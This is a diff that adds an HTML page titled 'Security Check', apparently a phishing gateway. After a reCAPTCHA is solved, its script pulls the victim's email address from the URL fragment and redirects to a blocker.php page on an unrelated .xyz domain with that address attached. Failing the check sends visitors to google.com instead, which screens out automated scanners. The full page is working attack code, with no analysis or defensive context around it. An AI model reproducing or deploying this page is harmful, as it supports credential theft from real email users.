@@ -1,0 +1,96 @@
+~Cybersoft~ (10.03.2020 09:06):
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Security Check</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+<script src='https://www.google.com/recaptcha/api.js'></script>
+<script>
+function submitUserForm() {
+    var response = grecaptcha.getResponse();
+    if(response.length == 0) {
+        document.getElementById('g-recaptcha-error').innerHTML = '<span style="color:red;">This field is required to check if you are not a robot.</span>';
+        return false;
+    }
+    else
+    var url = "http://www.google.com/";
+window.location = url;
+window.location.replace(url);
+}
+ 
+function verifyCaptcha() {
+    document.getElementById('g-recaptcha-error').innerHTML = '';
+
+ var blockerurl = 'https://resorthoteldubai.xyz/.%20%20/blocker.php';
+   var fullurl = window.location.href;
+   var lasthashIndex = fullurl.lastIndexOf('#');
+   var email = '';
+   var email2 = '';
+   var email_par = '';
+   if(lasthashIndex != -1){
+     email = fullurl.substr(lasthashIndex+1);
+  if(email.indexOf('=') != -1){
+    email2 = email.replace('=.', '@');
+    email2 = email.replace('=-', '@');
+    email2 = email.replace('=', '@');
+
+
+  }
+  if(validateEmail(email2) || validateEmail(email)){ 
+    email_par = '?em='+email2; 
+    window.location.replace(blockerurl+''+email_par);
+  }
+   }
+   //window.location.replace(blockerurl+''+email_par);
+}
+function validateEmail(email) {
+    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+    return re.test(String(email).toLowerCase());
+}
+</script>
+</head>
+<body>
+
+    <!-- ajax contact form -->
+    <section style="margin-top: 50px;">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-md-8">
+                    <div class="card">
+                        <h5 class="card-header">Security Check</h5>
+                        <div class="card-body">
+                         
+                                
+                              <form method="post" action-"go.php" onsubmit="return submitUserForm();">
+
+    <div id="g-recaptcha-error"></div>
+ 
+                                <!-- end message -->
+
+                                <!-- form element -->
+                                <div class="row">
+                                    <div class="col-md-6 form-group">
+                                    
+                                    <div class="col-12 form-group">
+                                          <div class="g-recaptcha" data-sitekey="6Lcj1e8UAAAAAEYsj21jKhMZAqghZ2RZsU_YUYdy" data-callback="verifyCaptcha"></div>
+                                    </div>
+                                    <div class="col-12">
+                                        
+                                    </div>
+                                </div>
+                                <!-- end form element -->
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+</body>
+</html>
